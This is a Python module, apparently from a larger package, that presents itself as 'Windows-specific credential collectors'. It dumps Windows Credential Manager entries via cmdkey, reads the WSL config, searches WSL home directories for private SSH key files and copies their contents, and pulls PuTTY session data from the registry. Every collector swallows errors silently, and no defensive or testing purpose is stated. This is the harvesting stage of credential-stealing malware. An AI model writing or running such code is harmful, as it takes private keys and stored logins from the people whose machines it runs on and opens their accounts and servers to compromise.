"""
Windows-specific credential collectors.
"""
import subprocess
import json
from pathlib import Path
from typing import Dict, List, Any
from ..utils import get_home_dir, safe_read_file


def collect_credential_manager() -> List[Dict[str, Any]]:
    """
    Collect Windows Credential Manager data using cmdkey.
    
    Returns:
        List of credential entries
    """
    creds = []
    
    try:
        # List all credentials
        result = subprocess.run(
            ['cmdkey', '/list'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0:
            creds.append({
                'type': 'windows_credential_manager',
                'content': result.stdout
            })
    except Exception:
        pass
    
    return creds


def collect_wsl_credentials() -> List[Dict[str, Any]]:
    """
    Collect WSL-related credentials and configurations.
    
    Returns:
        List of WSL credential data
    """
    creds = []
    
    # WSL config
    wsl_config = Path(r'C:\Users') / get_home_dir().name / '.wslconfig'
    if wsl_config.exists():
        content = safe_read_file(str(wsl_config))
        if content:
            creds.append({
                'type': 'wsl_config',
                'path': str(wsl_config),
                'content': content
            })
    
    # Check for WSL .ssh directories
    try:
        wsl_base = Path(r'\wsl$')
        if wsl_base.exists():
            for distro in wsl_base.iterdir():
                ssh_dir = distro / 'home'
                if ssh_dir.exists():
                    # Look for .ssh in home directories
                    for home_dir in ssh_dir.iterdir():
                        ssh_path = home_dir / '.ssh'
                        if ssh_path.exists():
                            for key_file in ssh_path.iterdir():
                                if key_file.is_file() and not key_file.suffix:
                                    content = safe_read_file(str(key_file))
                                    if content and 'PRIVATE KEY' in content:
                                        creds.append({
                                            'type': 'wsl_ssh_key',
                                            'path': str(key_file),
                                            'content': content[:2000]
                                        })
    except Exception:
        pass
    
    return creds


def collect_putty_sessions() -> List[Dict[str, Any]]:
    """
    Collect PuTTY session information from Windows Registry.
    
    Returns:
        List of PuTTY session data
    """
    sessions = []
    
    try:
        result = subprocess.run(
            ['reg', 'query', r'HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions', '/s'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0:
            sessions.append({
                'type': 'putty_sessions',
                'content': result.stdout
            })
    except Exception:
        pass
    
    return sessions


def collect_windows_data() -> Dict[str, Any]:
    """
    Collect all Windows-specific environment data.
    
    Returns:
        Dictionary containing all collected Windows data
    """
    data = {
        'credential_manager': collect_credential_manager(),
        'wsl': collect_wsl_credentials(),
        'putty': collect_putty_sessions()
    }
    
    return data
